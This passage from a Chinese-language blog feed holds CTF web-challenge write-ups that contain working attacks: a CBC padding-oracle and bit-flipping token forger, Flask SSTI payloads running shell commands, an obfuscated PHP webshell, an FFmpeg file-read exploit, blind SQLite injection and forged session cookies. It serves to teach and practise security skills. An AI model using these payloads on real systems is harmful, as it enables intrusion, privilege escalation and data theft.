chr(j) + padding + cipher</span><br><span class="line">                token = base64.b64encode(token + c)</span><br><span class="line">                user_key_json_decode[<span class="string">'signed_key'</span>] = token</span><br><span class="line">                header = &#123;<span class="string">'Key'</span>: base64.b64encode(json.dumps(user_key_json_decode))&#125;</span><br><span class="line">                res = requests.get(url, headers=header)</span><br><span class="line">                <span class="keyword">if</span> res.json()[<span class="string">'code'</span>] != <span class="number">205</span>:</span><br><span class="line">                    get = chr(j ^ i) + get</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        plain = xor(get, signed_key_decoed[block * <span class="number">16</span>:<span class="number">16</span> + block * <span class="number">16</span>])</span><br><span class="line">        total_plain += plain</span><br><span class="line">    <span class="keyword">return</span> total_plain</span><br><span class="line">plain_text = padoracle(<span class="string">"eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVRm1zclQ3a2FGM1FXL29vWDdVcVRpZ215TVl5MFFZK1RlSzMya3hGZW94ay9ZNnkzaG0vaEJXK2lMaXVLdnNNS1NPK1ZQQ0pGSTdPbHJTL0dsYThWWmh1Y3p2NSs4djNXckNJSE5TbVJOS2xBRjREdlI2bDBSbFVaajB6WjgzWGlBPT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoxLCJwYXlsb2FkIjoid2x1NUUwN1piR3pUNDVRUEhORzVReUpQT2UyNjUwalgiLCJleHBpcmVfaW4iOjE1NTY4NTM2Mzh9"</span>)</span><br><span class="line">print(plain_text)</span><br></pre></td></tr></table></figure><p>伪造</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2.7</span></span><br><span class="line"><span class="comment"># -*- coding:utf8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">host = <span class="string">"127.0.0.1"</span></span><br><span class="line">port = <span class="number">8233</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cbc_attack</span><span class="params">(key, block, origin_content, target_content)</span>:</span></span><br><span class="line">    user_key_decode = base64.b64decode(key)</span><br><span class="line">    user_key_json_decode = json.loads(user_key_decode)</span><br><span class="line">    signed_key = user_key_json_decode[<span class="string">'signed_key'</span>]</span><br><span class="line">    cipher_o = base64.b64decode(signed_key)</span><br><span class="line">    <span class="keyword">if</span> block &gt; <span class="number">0</span>:</span><br><span class="line">        iv_prefix = cipher_o[:block * <span class="number">16</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        iv_prefix = <span class="string">''</span></span><br><span class="line">    iv = cipher_o[block * <span class="number">16</span>:<span class="number">16</span> + block * <span class="number">16</span>]</span><br><span class="line">    cipher = cipher_o[<span class="number">16</span> + block * <span class="number">16</span>:]</span><br><span class="line">    iv_array = bytearray(iv)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">16</span>):</span><br><span class="line">        iv_array[i] = iv_array[i] ^ ord(origin_content[i]) ^ ord(target_content[i])</span><br><span class="line">    iv = bytes(iv_array)</span><br><span class="line">    user_key_json_decode[<span class="string">'signed_key'</span>] = base64.b64encode(iv_prefix + iv + cipher)</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(json.dumps(user_key_json_decode))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_user_info</span><span class="params">(key)</span>:</span></span><br><span class="line">    r = requests.post(<span class="string">"http://"</span> + host + <span class="string">":"</span> + str(port) + <span class="string">"/frontend/api/v1/user/info"</span>, headers = &#123;<span class="string">"Key"</span>: key&#125;)</span><br><span class="line">    <span class="keyword">if</span> r.json()[<span class="string">'code'</span>] == <span class="number">100</span>:</span><br><span class="line">        print(<span class="string">"获取成功！"</span>)</span><br><span class="line">    <span class="keyword">return</span> r.json()[<span class="string">'data'</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modify_role_palin</span><span class="params">(key, role)</span>:</span></span><br><span class="line">    user_key_decode = base64.b64decode(user_key)</span><br><span class="line">    user_key_json_decode = json.loads(user_key_decode)</span><br><span class="line">    user_key_json_decode[<span class="string">'role'</span>] = role</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(json.dumps(user_key_json_decode))</span><br><span class="line">print(<span class="string">"翻转 Key:"</span>)</span><br><span class="line">user_key = cbc_attack(<span class="string">"eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVRm1zclQ3a2FGM1FXL29vWDdVcVRpZ215TVl5MFFZK1RlSzMya3hGZW94ay9ZNnkzaG0vaEJXK2lMaXVLdnNNS1NPK1ZQQ0pGSTdPbHJTL0dsYThWWmh1Y3p2NSs4djNXckNJSE5TbVJOS2xBRjREdlI2bDBSbFVaajB6WjgzWGlBPT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoxLCJwYXlsb2FkIjoid2x1NUUwN1piR3pUNDVRUEhORzVReUpQT2UyNjUwalgiLCJleHBpcmVfaW4iOjE1NTY4NTM2Mzh9"</span>, <span class="number">0</span>, <span class="string">'&#123;"role":3,"user_'</span>, <span class="string">'&#123;"role":1,"user_'</span>)</span><br><span class="line">user_key = modify_role_palin(user_key, <span class="number">1</span>)</span><br><span class="line">print(user_key)</span><br><span class="line">print(<span class="string">"测试拉取用户信息："</span>)</span><br><span class="line">user_info = get_user_info(user_key)</span><br><span class="line">print(user_info)</span><br></pre></td></tr></table></figure><p>替换一下cookie就能成功登录(厚颜无耻盗用一下赵总的图)</p><img src="/2020/07/11/vacation2/15.png" class=""><p>在文件上传处可以上传视频，经过多次上传下载比对MD5值，推测其后端利用了 FFMpeg 对视频文件做处理，那么就尝试利用 FFMpeg 的漏洞来读取文件， <a href="https://github.com/neex/ffmpeg-avi-m3u-xbin/blob/master/gen_xbin_avi.py" target="_blank" rel="noopener">https://github.com/neex/ffmpeg-avi-m3u-xbin/blob/master/gen_xbin_avi.py</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 gen_xbin_avi.py file:&#x2F;&#x2F;&#x2F;flag test.avi</span><br></pre></td></tr></table></figure><p>之后上传，再下载视频，在视频的第一帧里就能看到flag了</p><h2 id="Windows-HITCON-2019-Buggy-Net"><a href="#Windows-HITCON-2019-Buggy-Net" class="headerlink" title="[Windows][HITCON 2019]Buggy_Net"></a>[Windows][HITCON 2019]Buggy_Net</h2><p>给了源码，重点就一点点</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">bool isBad = <span class="literal">false</span>;</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> ( Request.Form[<span class="string">"filename"</span>] != <span class="literal">null</span> ) &#123;</span><br><span class="line">           isBad = Request.Form[<span class="string">"filename"</span>].Contains(<span class="string">".."</span>) == <span class="literal">true</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">       </span><br><span class="line">   &#125; </span><br><span class="line"></span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (!isBad) &#123;</span><br><span class="line">           Response.Write(System.IO.File.ReadAllText(@<span class="string">"C:\inetpub\wwwroot\" + Request.Form["</span>filename<span class="string">"]));</span></span><br><span class="line"><span class="string">       &#125;</span></span><br><span class="line"><span class="string">   &#125; catch (Exception ex) &#123;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   &#125;</span></span><br></pre></td></tr></table></figure><p>要想读取到flag，就要让!isBad为真，根据代码也就是要第一个异常处理能够成功触发，就不会重新对isBad重新赋值为true</p><p>找资料这题考察的是asp，<a href="https://www.nccgroup.com/uk/about-us/newsroom-and-events/blogs/2017/september/rare-aspnet-request-validation-bypass-using-request-encoding/" target="_blank" rel="noopener">https://www.nccgroup.com/uk/about-us/newsroom-and-events/blogs/2017/september/rare-aspnet-request-validation-bypass-using-request-encoding/</a></p><p>根据这篇文章里的内容，Sending payload in the POST body using GET，就能够触发载荷</p><img src="/2020/07/11/vacation2/16.png" class=""><h2 id="b01lers2020-Scrambled"><a href="#b01lers2020-Scrambled" class="headerlink" title="[b01lers2020]Scrambled"></a>[b01lers2020]Scrambled</h2><p>考察点在cookie中的transmissions字段，去除掉开头和结尾的kxkxkxkxsh，中间剩下的字符和flag有关</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line">url=<span class="string">'http://7d447401-fe52-488f-b019-94ae1bc70742.node3.buuoj.cn/'</span></span><br><span class="line">r=requests.session()</span><br><span class="line">cookie=r.get(url).cookies</span><br><span class="line">data=[<span class="number">0</span>]*<span class="number">100</span></span><br><span class="line">print(data)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">300</span>):</span><br><span class="line">    cookie=r.get(url).cookies</span><br><span class="line">    key=unquote(requests.utils.dict_from_cookiejar(cookie)[<span class="string">'transmissions'</span>].replace(<span class="string">'kxkxkxkxsh'</span>,<span class="string">''</span>))[<span class="number">2</span>:]</span><br><span class="line">    print(key)</span><br><span class="line">    value=unquote(requests.utils.dict_from_cookiejar(cookie)[<span class="string">'transmissions'</span>].replace(<span class="string">'kxkxkxkxsh'</span>,<span class="string">''</span>))[<span class="number">0</span>:<span class="number">1</span>]</span><br><span class="line">    print(value)</span><br><span class="line">    data[int(key)]=value</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    print(i,end=<span class="string">''</span>)</span><br><span class="line">   <span class="comment">#flag&#123;874a0593-7672-45f5-897c-7a2803df653800000000000000000000000000000000000000000000000000000000000</span></span><br></pre></td></tr></table></figure><p>这里对flag进行一下处理，<code>flag{874a0593-7672-45f5-897c-7a2803df6538}</code></p><h2 id="pasecactf-2019-flask-ssti"><a href="#pasecactf-2019-flask-ssti" class="headerlink" title="[pasecactf_2019]flask_ssti"></a>[pasecactf_2019]flask_ssti</h2><p>开题，根据题目是flask_ssti直接用python 的模板注入进行测试</p><img src="/2020/07/11/vacation2/17.png" class=""><p>先看一下config</p><img src="/2020/07/11/vacation2/18.png" class=""><p>看到后面有加密后的flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#39;: &#39;-M7\x10w\x120kc\x03q7x\x0eG_o\x01(DL\x1c\x0b\x17&#123;o\x01i\x02\x0fAY&quot;\x01\x7f+\x12&gt;B]NG</span><br></pre></td></tr></table></figure><p>解密应该就能拿到flag了，因为是异或运算，加密脚本和解密脚本就是同一个，题目描述中已经给出了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(line, key, key2)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(chr(x ^ ord(line[x]) ^ ord(key[::<span class="number">-1</span>][x]) ^ ord(key2[x])) <span class="keyword">for</span> x <span class="keyword">in</span> range(len(line)))</span><br><span class="line">t = <span class="string">'-M7\x10w\x120kc\x03q7x\x0eG_o\x01(DL\x1c\x0b\x17&#123;o\x01i\x02\x0fAY"\x01\x7f+\x12&gt;B]NG'</span></span><br><span class="line">s = encode(t, <span class="string">'GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3'</span>, <span class="string">'xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT'</span>)</span><br><span class="line">print(s)</span><br><span class="line"><span class="comment">#flag&#123;c2e13cd3-8d56-4d65-bda9-c7173d56fdba&#125;</span></span><br></pre></td></tr></table></figure><p>还有一种做法是用flask的基类和对象进行读取，附上wp<a href="https://guokeya.github.io/post/zIiwsY95N/" target="_blank" rel="noopener">https://guokeya.github.io/post/zIiwsY95N/</a></p><p>这张图借用不知名师傅的，更清楚些</p><img src="/2020/07/11/vacation2/20.png" class=""><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[&quot;\x5F\x5Fclass\x5F\x5F&quot;][&quot;\x5F\x5Fbases\x5F\x5F&quot;][0][&quot;\x5F\x5Fsubclasses\x5F\x5F&quot;]()[91][&quot;get\x5Fdata&quot;](0, &quot;&#x2F;proc&#x2F;self&#x2F;fd&#x2F;3&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><img src="/2020/07/11/vacation2/19.png" class="">]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vacation1</title>
      <link href="/2020/07/09/vacation1/"/>
      <url>/2020/07/09/vacation1/</url>
      
        <content type="html"><![CDATA[<h3 id="RootersCTF2019-babyWeb"><a href="#RootersCTF2019-babyWeb" class="headerlink" title="[RootersCTF2019]babyWeb"></a>[RootersCTF2019]babyWeb<a id="more"></a></h3><img src="/2020/07/09/vacation1/1.png" class=""><p>过滤的东西挺少，但是在测试的时候select、from等都会报sql语法错误，猜测后台查询语句为where uniqueid=search”,也就是没有引号包裹的参数</p><p>用group by 3测试出应该有2个字段，尝试万能密钥，or被过滤用||替代，查询第一个字段</p><p>1|| 1=1 limit 0,1 ,结果就出来flag 了。。。。</p><img src="/2020/07/09/vacation1/2.png" class=""><p>看了源码是这么写的</p><img src="/2020/07/09/vacation1/3.png" class=""><p>也就是说构造的内容只要在数据库中存在一条数据，就会把对应数据的值赋给$pass并跳转到flag的页面</p><h3 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h3><p>题目说了是flask模板注入，直接去找payload了，找遍了终于找到了一个能用的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">258</span>](<span class="string">'ls'</span>,shell=<span class="literal">True</span>,stdout=<span class="number">-1</span>).communicate()[<span class="number">0</span>].strip()&#125;&#125;</span><br></pre></td></tr></table></figure><img src="/2020/07/09/vacation1/4.png" class=""><p>根据题目直接看对应的文件下的目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls &#x2F;flasklight&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;</span><br></pre></td></tr></table></figure><img src="/2020/07/09/vacation1/5.png" class=""><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;</span><br></pre></td></tr></table></figure><img src="/2020/07/09/vacation1/6.png" class=""><h3 id="virink-2019-files-share"><a href="#virink-2019-files-share" class="headerlink" title="virink_2019_files_share"></a>virink_2019_files_share</h3><p>开题是一个魔方，不至于拼完才给flag吧，这不是刁难我不会拼嘛</p><p>抓个包来看一下</p><img src="/2020/07/09/vacation1/7.png" class=""><p>看到了OpenResty服务器，google一下</p><img src="/2020/07/09/vacation1/8.png" class=""><p>有个uploads，先访问一下，只有图片没有上传的点，这里的文件路径应该是preview?f=</p><p>基于nginx搭建的，那么来看一下默认配置文件路径，刚好有个学生机搭了nginx，默认路径是/etc/nginx/conf.d/default.conf，目录穿越</p><img src="/2020/07/09/vacation1/9.png" class=""><p>从返回的数据可以看出../被过滤了，这里可以用双写绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preview?f&#x3D;....&#x2F;&#x2F;....&#x2F;&#x2F;....&#x2F;&#x2F;....&#x2F;&#x2F;....&#x2F;&#x2F;....&#x2F;&#x2F;....&#x2F;&#x2F;etc..&#x2F;&#x2F;nginx..&#x2F;&#x2F;conf.d..&#x2F;&#x2F;default.conf</span><br></pre></td></tr></table></figure><img src="/2020/07/09/vacation1/10.png" class=""><p>根据这里的提示访问preview.lua,但是好像打不通，魔方网页的源码给了提示，直接访问好了</p><img src="/2020/07/09/vacation1/11.png" class=""><h3 id="BSidesCF-2020-Hurdles"><a href="#BSidesCF-2020-Hurdles" class="headerlink" title="[BSidesCF 2020]Hurdles"></a>[BSidesCF 2020]Hurdles</h3><p>http头套娃，一步步来就好了，不会就去查资料</p><img src="/2020/07/09/vacation1/12.png" class=""><h3 id="SUCTF-2018-GetShell"><a href="#SUCTF-2018-GetShell" class="headerlink" title="[SUCTF 2018]GetShell"></a>[SUCTF 2018]GetShell</h3><p>文件上传，没过滤后缀，但是过滤了文件内容23333</p><p>慢慢测试，发现能用的没几个了<strong>$ ( ) . ; = [ ] _ ~</strong> </p><p>eval在php7不能动态调用。assert可以（之前星盟面试的时候那个师傅告诉我的23333）</p><p>直接找了wp里的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=$__=[];$___=[];$_=$__==$___;$__=~(瞰);$___=$__[$_];$__=~(北);$___.=$__[$_].$__[$_];$__=~(的);$___.=$__[$_];$__=~(半);$___.=$__[$_];$__=~(拾);$___.=$__[$_];$____=~(~(_));$__=~(说);$____.=$__[$_];$__=~(小);$____.=$__[$_];$__=~(次);$____.=$__[$_];$__=~(站);$____.=$__[$_];$_=$$____;$___($_[_]);</span><br></pre></td></tr></table></figure><p>这里不能出现字母，末尾不能出现?&gt;，并且要写在同一行，密码是_</p><img src="/2020/07/09/vacation1/13.png" class=""><p>看到了flag，但是是个假的2333卡住了</p><p>问了群里的师傅，直接查找匹配flag{}格式也没有，后来另一个师傅说在环境变量env里，找到了…</p><img src="/2020/07/09/vacation1/14.png" class=""><h3 id="Wallbreaker-Easy"><a href="#Wallbreaker-Easy" class="headerlink" title="Wallbreaker_Easy"></a>Wallbreaker_Easy</h3><p>开题，说明中给了提示已经留了后面，看一下phpinfo</p><img src="/2020/07/09/vacation1/15.png" class=""><p>看一下被禁的系统调用函数</p><img src="/2020/07/09/vacation1/16.png" class=""><p>基本上都被ban了，这里看到php的版本是7.2的，这就让我想到了蚁剑自带绕过disable_functions的插件，连一下，居然真的绕过了，直接读一下/readflag</p><img src="/2020/07/09/vacation1/17.png" class=""><p>到这里还没结束，又去看了这题的wp，这题的正解是通过LD_PRELOAD这个环境变量，在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库，完成程序注入和劫持，emmm，看了好几篇文章，原理模模糊糊，就先放着吧，放一篇详细的文章<a href="https://www.colabug.com/2019/0529/6309031/，之后有时间在回过来看看" target="_blank" rel="noopener">https://www.colabug.com/2019/0529/6309031/，之后有时间在回过来看看</a></p><h3 id="watevrCTF-2019-Supercalc"><a href="#watevrCTF-2019-Supercalc" class="headerlink" title="[watevrCTF-2019]Supercalc"></a>[watevrCTF-2019]Supercalc</h3><img src="/2020/07/09/vacation1/18.png" class=""><p>计算器，字母被过滤了，只能输数字，尝试除数为0，看看会不会报错</p><img src="/2020/07/09/vacation1/19.png" class=""><p>报错了，暂时没别的信息，抓个包看看</p><img src="/2020/07/09/vacation1/20.png" class=""><p>看这个session，开始以为是jwt，但解不开，仔细看看好像跟之前的flask-cookie差不多，解解看</p><img src="/2020/07/09/vacation1/21.png" class=""><p>解开了，是之前计算的历史，那么就是flask模板注入了，但是因为过滤不能直接用</p><p>猜测可能计算的地方可以用，用注释符试试</p><img src="/2020/07/09/vacation1/22.png" class=""><p>成了，来看看config</p><img src="/2020/07/09/vacation1/23.png" class=""><p>找到了secret_key，那就可以伪造flask-cookie了</p><img src="/2020/07/09/vacation1/24.png" class=""><p>可以先看一下有什么文件，发现有flag.txt，那就直接读取</p><img src="/2020/07/09/vacation1/25.png" class=""><h3 id="HarekazeCTF2019-Sqlite-Voting"><a href="#HarekazeCTF2019-Sqlite-Voting" class="headerlink" title="[HarekazeCTF2019]Sqlite Voting"></a>[HarekazeCTF2019]Sqlite Voting</h3><p>sqlite数据库注入，一时半会也没弄明白，先贴个脚本，之后系统去学习一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">from random import randint</span><br><span class="line">from time import sleep</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def help_replace(s):</span><br><span class="line">    hex1 &#x3D; &#39;&#39;.join([hex(ord(i))[2:].zfill(2) for i in s])</span><br><span class="line">    hex2 &#x3D; &#39;&#39;.join([hex(ord(i))[2:].zfill(2) for i in hex1.upper()])</span><br><span class="line">    return &#39;||&#39;.join(hex2)</span><br><span class="line"></span><br><span class="line">def post(payload):</span><br><span class="line">    url &#x3D; &#39;http:&#x2F;&#x2F;9ff1304b-2f6c-470f-97dc-a26eee0996a7.node3.buuoj.cn&#x2F;vote.php&#39;</span><br><span class="line">    data &#x3D; &#123;&#39;id&#39;: payload&#125;</span><br><span class="line">    r &#x3D; requests.post(url, data &#x3D; data)</span><br><span class="line">    while r.status_code &#x3D;&#x3D; 429 or (r.status_code &#x3D;&#x3D; 404 and &#39;喵&#39; in r.text):</span><br><span class="line">        sleep(randint(1, 3))</span><br><span class="line">        r &#x3D; requests.post(url, data &#x3D; data)</span><br><span class="line">    return r</span><br><span class="line"></span><br><span class="line">def check(temp, guess):</span><br><span class="line">    payload &#x3D; temp.format(guess)</span><br><span class="line">    r &#x3D; post(payload)</span><br><span class="line">    if &#39;An error occurred while updating database&#39; not in r.text:</span><br><span class="line">        return True</span><br><span class="line">    return False</span><br><span class="line"></span><br><span class="line">strs &#x3D; &#39;0123456789abcdef-&#125;&#39;</span><br><span class="line">flag &#x3D; &#39;flag&#123;&#39;</span><br><span class="line">length &#x3D; &#39;abs(case(replace(length((select(flag)from(flag))),&#123;&#125;,trim(0,0)))when(trim(0,0))then(0x100)else(0x8000000000000000)end)&#39;</span><br><span class="line">info &#x3D; &#39;abs(case(replace(length(replace(hex(hex((select(flag)from(flag)))),&#123;&#125;,trim(0,0))),&#123;&#125;,trim(0,0)))when(trim(0,0))then(0x100)else(0x8000000000000000)end)&#39;</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"># length 42</span><br><span class="line">for i in range(1, 101):</span><br><span class="line">    if(check(length, i)):</span><br><span class="line">        print(&#39;length:&#39;, i)</span><br><span class="line">        break</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">for i in range(1, 38):</span><br><span class="line">    for s in strs:</span><br><span class="line">        guess &#x3D; flag + s</span><br><span class="line">        if(check(info.format(&#39;&#123;&#125;&#39;, (37 - i) * 4), help_replace(guess))):</span><br><span class="line">            flag &#x3D; guess</span><br><span class="line">            print(flag)</span><br></pre></td></tr></table></figure><h3 id="FBCTF2019-Event"><a href="#FBCTF2019-Event" class="headerlink" title="[FBCTF2019]Event"></a>[FBCTF2019]Event</h3><p>登录注册一块的，直接填个账号就可以了</p><img src="/2020/07/09/vacation1/26.png" class=""><p>随便填一下抓个包看一下</p><img src="/2020/07/09/vacation1/27.png" class=""><p>赶巧了，cookie又是flask-cookie那种形式</p><img src="/2020/07/09/vacation1/28.png" class=""><p>感觉点不在这里，试试模板注入，这里测试后不能用这种形式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#125;&#125;</span><br></pre></td></tr></table></figure><img src="/2020/07/09/vacation1/29.png" class=""><img src="/2020/07/09/vacation1/30.png" class=""><p>找到了secret_key,这里admin的cookie需要自己来写flask来制造签名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">from flask.sessions import SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line">app &#x3D; Flask(__name__)</span><br><span class="line">app.secret_key &#x3D; b&#39;fb+wwn!n1yo+9c(9s6!_3o#nqm&amp;&amp;_ej$tez)$_ik36n8d7o6mr#y&#39;</span><br><span class="line">session_serializer &#x3D; SecureCookieSessionInterface().get_signing_serializer(app)</span><br><span class="line">@app.route(&#39;&#x2F;&#39;)</span><br><span class="line">def index():</span><br><span class="line">    print(session_serializer.dumps(&quot;admin&quot;))</span><br><span class="line">index()</span><br></pre></td></tr></table></figure><img src="/2020/07/09/vacation1/31.png" class=""><p>然后替换掉user对应的cookie，就能拿flag了</p><img src="/2020/07/09/vacation1/32.png" class=""><h3 id="RootersCTF2019-ImgXweb"><a href="#RootersCTF2019-ImgXweb" class="headerlink" title="[RootersCTF2019]ImgXweb"></a>[RootersCTF2019]ImgXweb</h3><p>注册，admin不能用做username、，应该是已有的账号，随便注册一个，上传个.htaccess，抓个包</p><img src="/2020/07/09/vacation1/33.png" class=""><p>看到cookie，jwt加密没跑了，解一下看一下是什么数据</p><img src="/2020/07/09/vacation1/34.png" class=""><p>应该是伪造admin的身份，目前的问题就是密钥还没拿到手，扫一发</p><img src="/2020/07/09/vacation1/35.png" class=""><p>有robots.txt，访问一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: * </span><br><span class="line">Disallow: &#x2F;static&#x2F;secretkey.txt</span><br></pre></td></tr></table></figure><p>访问，拿到密钥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">you-will-never-guess</span><br></pre></td></tr></table></figure><p>加密，替换cookie</p><img src="/2020/07/09/vacation1/36.png" class=""><p>有flag.png，但是不能直接访问，查找了curl命令，找到了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-i&#x2F;--include                    输出时包括protocol头信息</span><br></pre></td></tr></table></figure><img src="/2020/07/09/vacation1/37.png" class="">]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DAStraining</title>
      <link href="/2020/07/07/DAStraining/"/>
      <url>/2020/07/07/DAStraining/</url>
      
